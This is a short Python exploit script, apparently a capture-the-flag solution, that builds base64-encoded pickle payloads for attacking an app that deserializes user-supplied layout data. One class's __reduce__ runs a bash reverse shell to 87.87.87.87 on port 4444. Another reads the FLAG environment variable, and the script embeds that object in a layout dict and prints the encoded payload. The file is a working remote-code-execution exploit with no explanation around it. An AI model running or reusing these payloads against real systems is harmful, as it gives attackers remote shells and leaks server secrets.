import pickle
import base64
import os

class RCE_revers_shell:
    def __reduce__(self):
        cmd = "bash -c \"bash &>/dev/tcp/87.87.87.87/4444<&1\""
        return os.system, (cmd,)
class RCE_get_env:
    def __reduce__(self):
        cmd="FLAG"
        return os.getenv, (cmd,)


payload = [{'id': 'hako01', 'left': 1131, 'top': RCE_get_env()}]
my_layout = base64.b64encode(pickle.dumps(payload)).decode()
print(my_layout)
